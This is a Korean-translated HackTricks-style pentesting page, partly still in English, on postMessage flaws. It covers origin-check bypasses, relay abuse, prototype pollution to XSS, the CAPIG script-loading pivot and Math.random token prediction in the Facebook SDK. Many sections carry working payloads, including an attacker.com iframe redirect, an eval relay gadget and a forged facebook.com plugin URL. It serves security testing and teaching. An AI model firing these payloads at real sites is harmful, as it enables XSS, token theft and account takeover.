# PostMessage 취약점

{{#include ../../banners/hacktricks-training.md}}

## 전송 **PostMessage**

**PostMessage**는 다음 함수를 사용하여 메시지를 보냅니다:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
참고로 **targetOrigin**은 '\*'이거나 _https://company.com._ 같은 URL일 수 있습니다.\
두 번째 시나리오에서는, **message는 해당 domain으로만 전송될 수 있습니다** (Window object의 origin이 다르더라도).\
만약 **wildcard**가 사용되면, **messages는 어떤 domain으로든 전송될 수 있으며**, Window object의 origin으로 전송됩니다.

### iframe 및 wildcard를 이용한 **targetOrigin** 공격

설명된 [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)처럼, `X-Frame-Header` 보호가 없어 **iframed** 될 수 있고, **wildcard**(\*)를 사용해 **postMessage**로 **sending sensitive** message를 보내는 페이지를 찾는다면, **iframe**의 **origin**을 **modify**하여 그 **sensitive** message를 당신이 제어하는 domain으로 leak할 수 있습니다.\
페이지가 iframed될 수 있지만 **targetOrigin**이 **set to a URL and not to a wildcard**로 설정되어 있다면, 이 **trick won't work**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener 악용

**`addEventListener`** 는 JS가 **`postMessages`를 기대하는** 함수를 선언할 때 사용하는 함수입니다.\
다음과 유사한 코드가 사용됩니다:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### 열거

현재 페이지에서 **event listeners**를 찾기 위해 다음을 할 수 있습니다:

- JS 코드에서 `window.addEventListener` 와 `$(window).on` (_JQuery version_)를 **검색**
- 개발자 도구 콘솔에서 **실행**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- 브라우저 개발자 도구에서 _Elements --> Event Listeners_로 **이동**

![](<../../images/image (396).png>)

- [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) 또는 [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) 같은 **브라우저 확장**을 사용. 이러한 확장들은 **모든 메시지를 가로채서 보여줍니다**.

### Origin 체크 우회

- **`event.isTrusted`** 속성은 genuine user action에서 생성된 이벤트에만 `True`를 반환하므로 보안상 의미가 큽니다. 올바르게 구현되면 우회가 어렵지만, 보안 체크에서 중요합니다.
- PostMessage 이벤트의 origin 검증에 **`indexOf()`**를 사용하면 우회될 수 있습니다. 이 취약점을 보여주는 예는 다음과 같습니다:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`의 **`search()`** 메서드는 문자열이 아니라 정규식용입니다. regexp가 아닌 값을 넘기면 암묵적으로 정규식으로 변환되어 동작하므로 보안상 취약해질 수 있습니다. 정규식에서 점(.)은 와일드카드이기 때문에, 특수하게 조작된 도메인으로 검증을 우회할 수 있습니다. 예:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** 함수도 `search()`와 유사하게 정규식을 처리합니다. 정규식이 제대로 구성되지 않으면 우회될 수 있습니다.
- **`escapeHtml`** 함수는 입력을 이스케이프하여 정화하려는 목적이지만, 새로운 이스케이프된 객체를 생성하는 대신 기존 객체의 속성을 덮어씁니다. 이 동작은 악용될 수 있습니다. 특히 제어 가능한 객체의 속성이 `hasOwnProperty`를 인식하지 못하도록 조작할 수 있다면, `escapeHtml`이 기대한 대로 동작하지 않습니다. 아래 예에서 확인할 수 있습니다:

- 실패 예상:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- 이스케이프 우회:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

이 취약점의 맥락에서, `File` 객체는 읽기 전용 `name` 속성 때문에 특히 악용될 수 있습니다. 템플릿에서 사용될 때 이 속성은 `escapeHtml`에 의해 정화되지 않아 보안 위험을 초래합니다.

- 스크립트에서 `document.domain` 속성을 설정하면 도메인을 단축하여 동일 상위 도메인 내에서 same-origin 정책을 느슨하게 만들 수 있습니다.

### Origin-only trust + trusted relays

수신자가 **`event.origin`**만 검사하고 (예: `*.trusted.com`을 신뢰하는 경우), 그 origin에 공격자가 제어할 수 있는 파라미터를 받아서 `postMessage`로 지정된 `targetOrigin`/`targetWindow`에 그대로 반사하는 **"relay" 페이지**가 존재하는 경우가 많습니다. 예로 쿼리 파라미터를 받아 `{msg_type, access_token, ...}`을 `opener`/`parent`로 전달하는 마케팅/분석 도구가 있습니다. 다음과 같이 할 수 있습니다:

- `opener`가 있는 popup/iframe으로 피해자 페이지를 **열어** 해당 핸들러들이 등록되게 합니다 (많은 픽셀/SDK는 `window.opener`가 있을 때만 리스너를 붙입니다).
- 다른 공격자 창을 신뢰된 origin의 relay endpoint로 **이동**시켜 주입하고자 하는 메시지 필드(메시지 타입, 토큰, nonce 등)를 채웁니다.
- 메시지가 이제 **신뢰된 origin에서 온 것으로 보이므로**, origin-only 검증을 통과하고 피해자 리스너에서 권한이 필요한 동작(상태 변경, API 호출, DOM 쓰기)을 트리거할 수 있습니다.

실제 악용 패턴:

- Analytics SDK들(예: pixel/fbevents-style)은 `FACEBOOK_IWL_BOOTSTRAP` 같은 메시지를 소비한 뒤 **메시지에 포함된 토큰을 사용해 백엔드 API를 호출**하고 요청 본문에 **`location.href` / `document.referrer`**를 포함합니다. 자체 토큰을 공급하면 해당 토큰으로 이루어진 요청의 이력/로그를 **읽어** 피해자 페이지 URL/referrer에 포함된 OAuth 코드/토큰을 exfil 할 수 있습니다.
- 임의 필드를 `postMessage`로 반사하는 어떤 relay든 권한 있는 리스너가 기대하는 메시지 타입을 **스푸핑**하게 해줍니다. 약한 입력 검증과 결합하면 Graph/REST 호출, 기능 잠금 해제, 또는 CSRF와 유사한 흐름에 도달할 수 있습니다.

수색 팁: `event.origin`만 검사하는 `postMessage` 리스너들을 열거한 뒤, URL 파라미터를 `postMessage`로 전달하는 같은 origin의 HTML/JS 엔드포인트(마케팅 미리보기, 로그인 팝업, OAuth 에러 페이지 등)를 찾아보세요. 그런 다음 `window.open()` + `postMessage` 조합으로 origin 검증을 우회할 수 있습니다.

### e.origin == window.origin 우회

샌드박스된 iframe을 %%%%%% 사용해 임베드할 때, iframe의 origin이 `null`로 설정된다는 점을 이해하는 것이 중요합니다. 이는 sandbox 속성의 보안 및 기능적 영향과 밀접합니다.

sandbox 속성에 **`allow-popups`**를 지정하면, iframe 내부에서 여는 모든 popup은 부모의 sandbox 제한을 상속합니다. 따라서 **`allow-popups-to-escape-sandbox`** 속성이 포함되지 않으면 popup 창의 origin도 동일하게 `null`로 설정되어 iframe의 origin과 일치합니다.

결과적으로, 이러한 조건에서 popup이 열리고 iframe에서 popup으로 `postMessage`로 메시지를 보낼 때, 송신자와 수신자 양쪽의 origin이 모두 `null`이 됩니다. 이 경우 **`e.origin == window.origin`**은 `null == null`이므로 true로 평가됩니다.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### e.source 우회

메시지가 스크립트가 리스닝하는 동일한 창에서 왔는지 확인하는 것이 가능합니다 (특히 브라우저 확장의 Content Scripts가 메시지가 같은 페이지에서 보낸 것인지 확인할 때 흥미롭습니다):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
메시지의 **`e.source`**를 null로 만들려면 **iframe**이 **postMessage**를 **전송**하고 **즉시 삭제되도록** 생성하면 됩니다.

For more information **읽어보세요:**

{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

이러한 공격을 수행하려면 이상적으로는 **피해자 웹 페이지를** `iframe` 안에 넣을 수 있어야 합니다. 하지만 `X-Frame-Header` 같은 일부 헤더는 그러한 **동작을** **방지**할 수 있습니다.\
그러한 시나리오에서는 덜 은밀한 공격을 여전히 사용할 수 있습니다. 취약한 웹 애플리케이션을 새 탭으로 열고 그것과 통신할 수 있습니다:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### 메인 페이지를 차단하여 자식에게 전송된 메시지 훔치기

다음 페이지에서는 데이터를 전송하기 전에 **blocking**된 **main** 페이지로 인해 **child iframe**으로 전송된 **sensitive postmessage data**를 수신되기 전에 자식의 **XSS**를 악용하여 **leak the data**하는 방법을 볼 수 있습니다:

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### iframe 위치를 변경하여 메시지 훔치기

X-Frame-Header가 없는 웹페이지를 iframe할 수 있고 그 페이지가 다른 iframe을 포함하고 있다면, 해당 자식 iframe의 **change the location of that child iframe**를 수행할 수 있습니다. 만약 그 iframe이 **wildcard**를 사용해 전송된 **postmessage**를 받고 있다면, 공격자는 그 iframe의 **origin**을 자신이 **controlled**하는 페이지로 **change**하여 메시지를 **steal**할 수 있습니다:

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

postMessage를 통해 전송된 데이터가 JS에서 실행되는 경우, 페이지를 **iframe**하고 `postMessage`로 exploit을 전송해 **prototype pollution/XSS**를 **exploit**할 수 있습니다.

A couple of **very good explained XSS though `postMessage`** can be found in [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Example of an exploit to abuse **Prototype Pollution and then XSS** through a `postMessage` to an `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
**자세한 정보**:

- [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)에 대한 페이지 링크
- [**XSS**](../xss-cross-site-scripting/index.html)에 대한 페이지 링크
- [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)에 대한 페이지 링크

### 출처 기반 스크립트 로딩 및 공급망 피벗 (CAPIG 사례 연구)

`capig-events.js`는 `window.opener`가 존재할 때만 `message` 핸들러를 등록했습니다. `IWL_BOOTSTRAP`에서 `pixel_id`를 확인했지만 `event.origin`을 저장했고 이후 `${host}/sdk/${pixel_id}/iwl.js`를 구성하는 데 사용했습니다.

<details>
<summary>핸들러가 attacker-controlled origin을 기록</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Get an opener: e.g., in Facebook Android WebView reuse `window.name` with `window.open(target, name)` so the window becomes its own opener, then post a message from a malicious iframe.
   예: Facebook Android WebView에서 `window.name`을 `window.open(target, name)`으로 재사용해 창이 자체 opener가 되게 한 다음, 악성 iframe에서 postMessage를 보냅니다.
2. Send `IWL_BOOTSTRAP` from any origin to persist `host = event.origin` in `localStorage`.
   어떤 origin에서든 `IWL_BOOTSTRAP`을 보내 `host = event.origin`을 `localStorage`에 지속시킵니다.
3. Host `/sdk/<pixel_id>/iwl.js` on any CSP-allowed origin (takeover/XSS/upload on a whitelisted analytics domain). `startIWL()` then loads attacker JS in the embedding site (e.g., `www.meta.com`), enabling credentialed cross-origin calls and account takeover.
   `/sdk/<pixel_id>/iwl.js`를 어떤 CSP-allowed origin에 호스트합니다(whitelisted analytics domain에서 takeover/XSS/upload 등). 그런 다음 `startIWL()`이 embedding site(예: `www.meta.com`)에 공격자 JS를 로드해 credentialed cross-origin calls와 account takeover를 가능하게 합니다.

If direct opener control was impossible, compromising a third-party iframe on the page still allowed sending the crafted `postMessage` to the parent to poison the stored host and force the script load.
직접적인 opener 제어가 불가능했더라도, 페이지의 third-party iframe을 침해하면 crafted `postMessage`를 부모로 보내 저장된 host를 오염시켜 스크립트 로드를 강제할 수 있었습니다.

### Backend-generated shared script → stored XSS:
the plugin `AHPixelIWLParametersPlugin` concatenated user rule parameters into JS appended to `capig-events.js` (e.g., `cbq.config.set(...)`). Injecting breakouts like `"]}` injected arbitrary JS, creating stored XSS in the shared script served to all sites loading it.
플러그인 `AHPixelIWLParametersPlugin`은 사용자 규칙 파라미터를 `capig-events.js`에 추가되는 JS에 이어붙였습니다(예: `cbq.config.set(...)`). `"]}` 같은 breakouts를 주입하면 임의의 JS가 주입되어 이를 로드하는 모든 사이트에 제공되는 shared script에 stored XSS가 발생했습니다.

### Trusted-origin allowlist isn't a boundary
A strict `event.origin` check only works if the **trusted origin cannot run attacker JS**. When privileged pages embed third-party iframes and assume `event.origin === "https://partner.com"` is safe, any XSS in `partner.com` becomes a bridge into the parent:
`event.origin`에 대한 엄격한 검사는 **trusted origin이 attacker JS를 실행할 수 없는 경우에만** 작동합니다. 권한이 높은 페이지가 third-party iframe을 임베드하고 `event.origin === "https://partner.com"`을 안전하다고 가정할 때, `partner.com`의 어떤 XSS든 부모로 통하는 다리가 됩니다:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
실제 공격에서 관찰된 패턴:

1. **파트너 iframe에서 XSS를 악용**하고 릴레이 가젯을 심어 모든 `postMessage`가 신뢰된 origin 내부에서 code exec이 되게 한다:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **공격자 페이지에서**, 손상된 iframe에 JS를 보내 부모로 허용된 메시지 타입을 전달하도록 한다. 메시지는 `partner.com`에서 시작하여 allowlist를 통과하고 HTML을 포함하며 안전하지 않게 삽입된다:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. 부모(상위) 문서가 공격자 HTML을 주입하여 **JS execution in the parent origin** (예: `facebook.com`)을 허용합니다. 이는 OAuth 코드를 탈취하거나 계정 완전 탈취 흐름으로 전환하는 데 사용될 수 있습니다.

Key takeaways:

- **Partner origin isn't a boundary**: 'trusted' 파트너에서 발생한 어떤 XSS도 공격자가 허용된 메시지를 전송해 `event.origin` 검사를 우회할 수 있게 합니다.
- 핸들러가 **render partner-controlled payloads**(예: 특정 메시지 타입에서의 `innerHTML`)을 수행하면 파트너 탈취는 same-origin DOM XSS가 됩니다.
- 넓은 **message surface**(많은 타입, 구조 검증 부재)는 파트너 iframe이 탈취된 이후 피벗할 수 있는 더 많은 가젯을 제공합니다.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

메시지 검증이 `Math.random()`으로 생성된 “shared secret”(예: `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`)을 사용하고 같은 헬퍼가 플러그인 iframe의 이름도 지정하면 PRNG 출력을 복구해 신뢰된 메시지를 위조할 수 있습니다:

- **Leak PRNG outputs via `window.name`:** SDK는 플러그인 iframe을 `guid()`로 자동 이름 지정합니다. top frame을 제어할 수 있다면 victim 페이지를 iframe으로 넣고 플러그인 iframe을 당신의 origin으로 이동시킨 다음(예: `window.frames[0].frames[0].location='https://attacker.com'`) `window.frames[0].frames[0].name`을 읽어 원시 `Math.random()` 출력을 얻을 수 있습니다.
- **Force more outputs without reloads:** 일부 SDK는 재초기화 경로를 제공합니다; FB SDK에서는 `{xfbml:1}`와 함께 `init:post`를 트리거하면 `XFBML.parse()`가 강제 실행되어 플러그인 iframe을 파괴·재생성하고 새로운 이름/콜백 ID를 생성합니다. 반복 재초기화로 필요한 만큼의 PRNG 출력을 얻을 수 있습니다(콜백/iframe ID를 위한 추가 내부 `Math.random()` 호출이 있으므로 중간 값을 건너뛰어야 합니다).
- **Trusted-origin delivery via parameter pollution:** 퍼스트파티 플러그인 엔드포인트가 정제되지 않은 파라미터를 cross-window payload에 반사하면(예: `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), 신뢰된 `facebook.com` origin을 유지하면서 `&type=...&iconSVG=...`을 주입할 수 있습니다.
- **Predict the next callback:** leaked iframe names을 `[0,1)` 범위의 부동소수점으로 변환하고 여러 값(비연속 값 포함)을 V8 `Math.random` 예측기(예: Z3 기반)에 입력합니다. 로컬에서 다음 `guid()`를 생성해 예상되는 콜백 토큰을 위조합니다.
- **Trigger the sink:** postMessage 데이터를 조작하여 브리지가 `xd.mpn.setupIconIframe`을 디스패치하고 `iconSVG`에 HTML을 삽입하도록 합니다(예: URL-encoded `<img src=x onerror=...>`). 이렇게 하면 호스팅 origin 내부에서 DOM XSS가 발생하고, 거기서부터 same-origin iframe들(OAuth dialogs, arbiters 등)을 읽을 수 있습니다.
- **Framing quirks help:** 이 체인은 프레이밍을 필요로 합니다. 일부 모바일 webview에서는 `frame-ancestors`가 있을 때 `X-Frame-Options`가 지원되지 않는 `ALLOW-FROM`으로 저하될 수 있고, “compat” 파라미터는 관대하게 허용된 `frame-ancestors`를 강제하여 `window.name` 사이드 채널을 활성화할 수 있습니다.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 참고자료

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- 연습용: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
